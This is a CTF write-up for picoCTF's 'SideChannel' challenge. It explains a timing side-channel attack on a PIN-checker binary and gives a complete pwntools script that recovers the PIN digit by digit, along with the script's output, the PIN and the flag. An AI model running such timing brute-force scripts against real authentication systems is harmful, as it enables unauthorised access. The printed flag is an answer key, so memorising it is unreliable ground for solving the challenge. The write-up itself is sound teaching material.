# **SideChannel: 400 pts**

### Key points

- Timing-based side-channel attack

---

## **Contents**

- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)

---

## Overview

### Description

> There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag?

Let's run the binary:

```console
$ ./pin_checker
Please enter your 8-digit PIN code:
12345678
8
Checking PIN...
Access denied.
```

```console
$ ./pin_checker
Please enter your 8-digit PIN code:
5
1
Incorrect length.
```

Okay, so we need to input an 8-digit pin. If the pin is correct, the program outputs our flag.

---

## Solution

Most people's first thought may be to decompile the binary in Ghidra, but one of the hints says reverse-engineering or trying to exploit the binary won't work. Sure enough, Ghidra has trouble decompiling it successfully.

### **Timing-based side-channel attack**

A [timing-attack](https://en.wikipedia.org/wiki/Timing_attack) is an attack where an attacker tryings to figure out a secret key by analyzing the time it takes for an cryptosystem to execute based on inputted keys. Let's think about a generic case for how the program might check our key:

Assume the secret key is `12345678`.

Say we input `00000000`. The program might loop through each digit and check if it is equal to the corresponding digit in the secret key. If not, it will break the loop and exit. In this case, it will exit after the 1st digit.

What if we input `12340000`? The program loops until the 5th digit, then exits. Theoretically, this should take longer than the previous case, as instead of checking 1 digit the program now checks 5.

In general, if a digit is correct, the runtime should be longer. Let's implement a timing-attack brute-force script.

---

### **The Script**

Our attack function starts a new process and sends our test key with the test digit, recording the time it takes for the program to return a result. We loop through 10 possible digits for each digits and compare the times. The digit with the longest running time should be the correct one. We repeat this for all 8 digits.

```py
from pwn import *
from time import time

@context.quietfunc
def timing_attack():
    print("[+] Beginning timing attack. To improve timing accuracy, close background processes and remain on this window.")
    key = ""
    for i in range(8):
        times = []
        for j in range(10):
            p = process("./pin_checker")
            p.sendline(pad(key + str(j)).encode())
            start_time = time()
            p.recvall()
            end_time = time()
            times.append(end_time - start_time)
            p.close()
        key += check_digit(times)
        print(f"[+] {i + 1} digits found: {key}")
    return key
```

`check_digit()` returns the digit with the longest running time:

```py
def check_digit(times):
    correct_digit = 0
    max = 0
    for digit, time in enumerate(times):
        if time > max:
            correct_digit = digit
            max = time
    return str(correct_digit)
```

`pad()` pads the right side of the key with 0s until the length is 8:

```py
def pad(key):
    return key + (8 - len(key)) * "0"
```

Sometimes, the timing may be inaccurate due to background processes, resulting in incorrect keys. It's best to remain on the window and avoid starting/stopping background processes while the script is running.

To verify that our key is correct, we can run the binary again with our key. If it is correct, we will send it to the remote server to get our flag.

```py
@context.quietfunc
def verify_key(key):
    p = process("./pin_checker")
    p.sendline(key.encode())
    result = p.recvall()
    if b"Access granted" in result:
        print("[+] Key verified! Sending to master server...")
        r = remote("saturn.picoctf.net", "50364")
        r.sendline(key.encode())
        result = str(r.recvall())
        r.close()
        FLAG = result[result.index("picoCTF"):result.index("}") + 1]
        print("[+] Flag:", FLAG)
        return True
    else:
        print("[!] Attack failed. Wrong key found.")
        print("[-] Trying again...")
        return False
```

If the key is incorrect, we will loop and try the attack again, until we find the correct key.

```py
if __name__ == "__main__":
    found = False
    while not found:
        key = timing_attack()
        print("[+] Key found:", key)
        found = verify_key(key)
```

Let's run it:

```console
$ python3 solve.py
[+] Beginning timing attack. To improve timing accuracy, close background processes and do not change windows.
[+] 1 digits found: 4
[+] 2 digits found: 48
[+] 3 digits found: 483
[+] 4 digits found: 4839
[+] 5 digits found: 48390
[+] 6 digits found: 483905
[+] 7 digits found: 4839051
[+] 8 digits found: 48390513
[+] Key found: 48390513
[+] Key verified! Sending to master server...
[+] Flag: picoCTF{t1m1ng_4tt4ck_914c5ec3}

```

The key turns out to be `48390513`, and we got our flag.
The full script is in `solve.py`.

---

## Flag

> `picoCTF{t1m1ng_4tt4ck_914c5ec3}`
